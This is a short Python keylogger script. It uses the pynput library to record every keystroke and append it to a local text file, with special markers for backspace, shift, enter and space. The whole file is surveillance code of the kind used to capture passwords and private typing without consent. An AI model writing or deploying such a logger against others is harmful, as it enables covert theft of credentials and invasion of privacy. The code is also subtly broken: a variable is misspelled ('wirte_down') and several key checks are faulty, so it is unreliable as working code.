#!/bin/python3

from pynput.keyboard import Listener #imports keyboard listener
path = 'keyboard_Input.txt'
keyboard_Input = []
count = 0

#onpress function
def on_press(key):
    global keyboard_Input, count
    keyboard_Input.append(key)
    count += 1

    if count > 0:
        count = 0
        write_to_file(keyboard_Input)
        keyboard_Input = []

#function to write pressed keys to file.
def write_to_file(keys):
    with open(path, 'a') as file:
        for key in keyboard_Input:
            write_down = str(key).replace("'", "")
            if wirte_down.find('backspace') > 0:
                file.write(' *BACKSPACE* ')
            elif write_down.find('shift') > 0:
                file.write(' *SHIFT* ')
            elif write_down.find('enter') > 0:
                file.write('\n')
            elif write_down.find('space') > 0:
                file.write(' ')
            elif write_down.find('key'):
                file.write(write_down)

#pynput.keyboard Listener
with Listener(on_press=on_press) as listener:
    listener.join()
